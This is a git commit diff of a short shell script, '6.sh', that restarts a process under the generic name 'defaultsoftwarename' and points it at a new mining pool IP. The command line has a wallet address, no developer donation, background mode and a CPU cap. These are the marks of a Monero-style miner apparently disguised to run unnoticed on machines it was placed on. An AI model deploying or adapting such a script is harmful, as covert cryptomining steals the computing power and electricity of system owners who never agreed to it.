4fe7618e8d121d8ec4d47a8341c7707530329318
solscobbturpa <57539661+solscobbturpa@users.noreply.github.com>
2019-12-09 01:25:02 -0800

    Update 6.sh

--- 6.sh
+++ 6.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o 79.137.44.196:49228 -u 48moEJhh3YGNomdXrGwhXkfjN357cUHSe9euFXMLCwHaPo47K5oixUQiZizbbJ5cYfgnh4xYRyHt36hWhE3DyjRrRLBqshq --pass=x:solscobbturpa@gmail.com --rig-id=02 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=81 --av=1
+defaultsoftwarename -o 178.33.150.153:49228 -u 48moEJhh3YGNomdXrGwhXkfjN357cUHSe9euFXMLCwHaPo47K5oixUQiZizbbJ5cYfgnh4xYRyHt36hWhE3DyjRrRLBqshq --pass=x:solscobbturpa@gmail.com --rig-id=02 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=81 --av=1
